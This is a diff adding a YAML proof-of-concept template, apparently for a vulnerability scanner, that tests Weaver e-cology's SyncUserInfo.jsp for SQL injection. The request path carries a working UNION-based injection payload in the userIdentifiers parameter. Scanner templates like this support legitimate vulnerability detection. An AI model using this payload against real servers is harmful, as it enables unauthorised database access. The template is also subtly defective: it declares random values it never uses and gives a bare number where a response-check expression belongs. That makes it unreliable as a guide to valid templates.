@@ -1,0 +1,15 @@
+name: poc-yaml-ecology-syncuserinfo-sqli
+set:
+  r1: randomInt(40000, 44800)
+  r2: randomInt(40000, 44800)
+rules:
+  - method: GET
+    path: >-
+      /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(2*3333),null
+    follow_redirects: true
+    expression: |
+      6666
+detail:
+  author: MaxSecurity(https://github.com/MaxSecurity)
+  links:
+    - https://www.weaver.com.cn/
